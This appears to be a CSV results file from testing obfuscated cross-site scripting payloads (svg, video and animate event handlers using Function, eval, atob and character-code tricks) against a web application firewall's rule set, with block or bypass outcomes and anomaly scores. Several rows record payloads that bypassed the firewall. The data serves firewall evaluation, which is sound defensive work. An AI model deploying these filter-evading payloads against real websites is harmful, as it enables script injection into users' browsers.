index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
163,"<svg onload='new Function(atob(""YWxlcnQoMSk=""))()'>",0,1,block,5,"934100,941100,941160,941390,949110","o13,13v220,51 || v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v220,51t:htmlEntityDecode,t:jsDecode || ",20,176482733514.086599
164,"<svg onload='new Function(atob(""YWxlcnQoMjQp""))()'>",0,1,block,5,"934100,941100,941160,941390,949110","o13,13v220,51 || v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v220,51t:htmlEntityDecode,t:jsDecode || ",20,176482733849.682519
165,"<svg onload='new Function(atob(""d2luZG93LmFsZXJ0KDEp""))()'></svg>",0,1,block,5,"934100,941100,941160,941390,949110","o13,13v221,65 || v221,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,65t:htmlEntityDecode,t:jsDecode || ",20,176482734159.421143
166,"<svg onload='this.remove();(function(){var a=String.fromCharCode(97,108,101,114,116);window[a](1)})()'>",0,1,block,6,"934100,934100,941100,941160,941370,949110","o28,11v221,103 || o27,11v221,103t:removeWhitespace || v221,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,9v221,103t:urlDecodeUni,t:compressWhitespace || ",25,17648273445.130899
167,"<svg onload='this.remove();(new Function(""al""+""ert(1)""))()'>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o28,13v221,60 || o28,13v221,60t:urlDecodeUni || v221,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,13v221,60t:htmlEntityDecode,t:jsDecode || ",25,176482734698.158838
168,<svg onload=(Function('\u0061\u006c\u0065\u0072\u0074(1)'))()>,0,1,block,5,"920540,941100,941160,941390,949110","v158,10o23,6v221,62 || v221,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,6v221,62t:htmlEntityDecode,t:jsDecode || ",20,176482734924.176581
169,<svg onload=(Function('al'+'ert(1)'))()>,0,1,bypass,2,"941100,941160","v220,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482735247.176603
170,<svg onload=(Function('al\x65rt(1)'))()>,0,1,block,4,"941100,941160,941390,949110","v220,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,6v220,40t:htmlEntityDecode,t:jsDecode || ",15,176482735584.538316
171,"<svg onload=(function(){Function('','\x61\x6c\x65\x72\x74(1)')();})()>",0,1,block,7,"934100,934100,934100,941100,941160,941390,949110","o13,11v221,70 || o13,11v221,70t:jsDecode || o12,11v221,70t:removeWhitespace || v221,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,6v221,70t:htmlEntityDecode,t:jsDecode || ",30,176482735821.346820
172,<svg onload=(function(){Function('a'+'ler'+'t(1)')()})()>,0,1,block,6,"934100,934100,934100,941100,941160,949110","o13,11v221,57 || o13,11v221,57t:urlDecodeUni || o12,11v221,57t:removeWhitespace || v221,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,176482736191.509270
173,<svg onload=(function(){Function(atob('YWxlcnQoMSk='))()})()>,0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,11v221,61 || o12,11v221,61t:removeWhitespace || v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,5v221,61t:htmlEntityDecode,t:jsDecode || ",25,176482736377.706160
174,<svg onload=(function(){eval(atob('YWxlcnQoMSk='))})()>,0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o24,25v220,55 || o13,11v220,55 || o12,11v220,55t:removeWhitespace || v220,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,5v220,55t:htmlEntityDecode,t:jsDecode || ",30,176482736645.909406
175,<svg onload=(function(){eval(unescape('%61%6c%65%72%74%28%31%29'));})()>,0,1,block,8,"933160,934100,934100,934100,941100,941160,941390,949110","o24,41v221,72 || o13,11v221,72 || o13,11v221,72t:urlDecodeUni || o12,11v221,72t:removeWhitespace || v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,5v221,72t:htmlEntityDecode,t:jsDecode || ",35,176482736915.247276
176,<svg onload=(function(){window['a'+'\u006c'+'\u0065'+'\u0072'+'\u0074']('XSS')})()>,0,1,block,9,"920540,934100,934100,934100,934100,941100,941160,941370,949110","v158,10o36,6v221,83 || o13,11v221,83 || o13,11v221,83t:urlDecodeUni || o13,11v221,83t:jsDecode || o12,11v221,83t:removeWhitespace || v221,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,47v221,83t:urlDecodeUni,t:compressWhitespace || ",40,176482737240.107548
177,<svg onload=(function(){window['al'+'ert'](1);})()>,0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o13,11v221,51 || o13,11v221,51t:urlDecodeUni || o12,11v221,51t:removeWhitespace || v221,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v221,51t:urlDecodeUni,t:compressWhitespace || ",30,176482737573.368445
178,<svg onload=(function(){window[atob('YWxlcnQ=')](1);})()>,0,1,block,7,"934100,934100,941100,941160,941370,941390,949110","o13,11v221,57 || o12,11v221,57t:removeWhitespace || v221,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,24v221,57t:urlDecodeUni,t:compressWhitespace || o31,5v221,57t:htmlEntityDecode,t:jsDecode || ",30,176482737854.184016
179,<svg onload=Function('a'+'lert(1)')()>,0,1,bypass,2,"941100,941160","v220,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482738033.817188
180,"<svg onload=Function('a'+String.fromCharCode(108,101,114,116)+'(1)')()>",0,1,block,6,"934100,934100,934100,941100,941160,949110","o25,19v221,71 || o25,19v221,71t:urlDecodeUni || o23,19v221,71t:removeWhitespace || v221,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,176482738360.734785
181,<svg onload=Function('al'+'\u0065rt(1)')()>,0,1,block,4,"920540,941100,941160,949110","v158,10o27,6v220,43 || v220,43t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,43t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,176482738683.453906
182,<svg onload=Function('al'+'ert(1)')()>,0,1,bypass,2,"941100,941160","v220,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482738945.801715
183,<svg onload=Function('al'+String.fromCharCode(101)+'rt(1)')()>,0,1,block,6,"934100,934100,934100,941100,941160,949110","o26,19v221,62 || o26,19v221,62t:urlDecodeUni || o24,19v221,62t:removeWhitespace || v221,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,176482739278.096507
184,<svg onload=Function('eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)')()>,0,1,block,9,"920540,933160,934100,934100,934100,941100,941160,941390,949110","v158,10o29,6v221,73 || o20,46v221,73 || o22,5v221,73 || o22,5v221,73t:jsDecode || o21,5v221,73t:removeWhitespace || v221,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,5v221,73t:htmlEntityDecode,t:jsDecode || ",40,176482739524.502979
185,<svg onload=Function('eval(unescape(`%61%6c%65%72%74%281%29`))')()>,0,1,block,8,"933160,934100,934100,934100,941100,941160,941390,949110","o20,41v221,67 || o22,5v221,67 || o22,5v221,67t:urlDecodeUni || o21,5v221,67t:removeWhitespace || v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,5v221,67t:htmlEntityDecode,t:jsDecode || ",35,176482739793.829893
186,"<svg onload=Function('setTime'+'out(atob(""YWxlcnQoOCk=""),0)')()>",0,1,block,4,"941100,941160,941390,949110","v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,5v221,64t:htmlEntityDecode,t:jsDecode || ",15,176482740077.869184
187,"<svg onload=Function(String.fromCharCode(97,108,101,114,116,40,49,41))()>",0,1,block,5,"934100,934100,941100,941160,949110","o21,19v221,73 || o20,19v221,73t:removeWhitespace || v221,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,176482740326.767501
188,"<svg onload=Function(atob(""YWxlcnQoMSk=""))()>",0,1,block,4,"941100,941160,941390,949110","v220,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,5v220,45t:htmlEntityDecode,t:jsDecode || ",15,176482740615.716434
189,"<svg onload=setTimeout(function(){eval('al'+String.fromCharCode(101)+'rt(1)')},0)>",0,1,block,8,"933160,934100,934100,934100,941100,941160,941390,949110","o34,34v221,82 || o23,11v221,82 || o23,11v221,82t:urlDecodeUni || o22,11v221,82t:removeWhitespace || v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,11v221,82t:htmlEntityDecode,t:jsDecode || ",35,176482740931.097479
190,"<svg><animate onbegin=""this.onbegin=null;(new Function('ale'+'rt(22)')).call()""></animate></svg>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o42,13v221,96 || o42,13v221,96t:urlDecodeUni || v221,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,13v221,96t:htmlEntityDecode,t:jsDecode || ",25,176482741243.806931
191,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,10,"932235,933160,934100,934100,941100,941110,941130,941160,941390,949110","o89,8v221,174 || o100,25v221,174 || o100,5v221,174 || o98,5v221,174t:removeWhitespace || v221,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v221,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v221,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o94,5v221,174t:htmlEntityDecode,t:jsDecode || ",45,176482741596.487827
192,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>eval(atob('YWxlcnQoMSk='))</script>""></iframe></div></foreignObject></svg>",0,1,block,9,"933160,934100,934100,941100,941110,941130,941160,941390,949110","o86,25v221,160 || o86,5v221,160 || o84,5v221,160t:removeWhitespace || v221,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v221,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v221,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,5v221,160t:htmlEntityDecode,t:jsDecode || ",40,176482741725.048111
193,"<svg><image href=""#"" onerror=""Function('eval(String.fromCharCode(97,108,101,114,116,40,49,41))')()""></svg>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o38,55v221,106 || o40,5v221,106 || o38,5v221,106t:removeWhitespace || v221,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o40,5v221,106t:htmlEntityDecode,t:jsDecode || ",30,176482742050.022715
194,"<video src onerror=""new Function('al'+'ert(1)')()"">",0,1,block,6,"934100,934100,941100,941160,941390,949110","o20,13v220,51 || o20,13v220,51t:urlDecodeUni || v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,7v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o20,13v220,51t:htmlEntityDecode,t:jsDecode || ",25,17648274231.128197
195,"<video src onerror=""new Function(atob('YWxlcnQoMSk='))()"">",0,1,block,5,"934100,941100,941160,941390,949110","o20,13v220,58 || v220,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,7v220,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o20,13v220,58t:htmlEntityDecode,t:jsDecode || ",20,176482742646.789549
196,"<video src onerror='(new Function(atob(""YWxlcnQoMSk="")))()'>",0,1,block,5,"934100,941100,941160,941390,949110","o21,13v221,60 || v221,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,7v221,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,13v221,60t:htmlEntityDecode,t:jsDecode || ",20,17648274291.608588
197,<video src onerror='(new Function(atob(&#x22;YWxlcnQoMSk=&#x22;)))()'>,0,1,block,5,"934100,941100,941160,941390,949110","o21,13v221,70 || v221,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,7v221,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,13v221,70t:htmlEntityDecode,t:jsDecode || ",20,17648274326.843302
198,"<video><source onerror=""((function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41));})())""></video>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o37,53v221,107 || o26,11v221,107 || o25,11v221,107t:removeWhitespace || v221,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v221,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,5v221,107t:htmlEntityDecode,t:jsDecode || ",30,176482743483.406614
199,"<video><source onerror=""(new Function('al'+'ert(1)'))()""></video>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o25,13v221,65 || o25,13v221,65t:urlDecodeUni || v221,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v221,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,65t:htmlEntityDecode,t:jsDecode || ",25,176482743749.646925
200,"<video><source onerror='(new Function(""return a""+""lert(1)""))()' src='#'></video>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o25,13v221,80 || o25,13v221,80t:urlDecodeUni || v221,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v221,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,80t:htmlEntityDecode,t:jsDecode || ",25,176482744035.052817
